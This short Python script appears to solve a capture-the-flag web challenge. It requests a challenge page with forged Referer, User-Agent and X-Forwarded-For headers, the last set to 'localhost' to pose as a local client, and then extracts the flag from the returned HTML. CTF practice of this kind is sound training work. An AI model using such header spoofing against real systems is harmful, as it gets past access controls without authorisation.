import requests
from bs4 import BeautifulSoup

url = 'http://node5.buuoj.cn:26591/Secret.php'
headers = {
    'Referer': 'https://Sycsecret.buuoj.cn',
    'User-Agent': 'Syclover',
    'X-Forwarded-For': 'localhost'
}
r = requests.get(url, headers=headers)
# print(r.text)
soup = BeautifulSoup(r.text, 'html.parser')
flag = soup.h1.text.strip()
print(flag)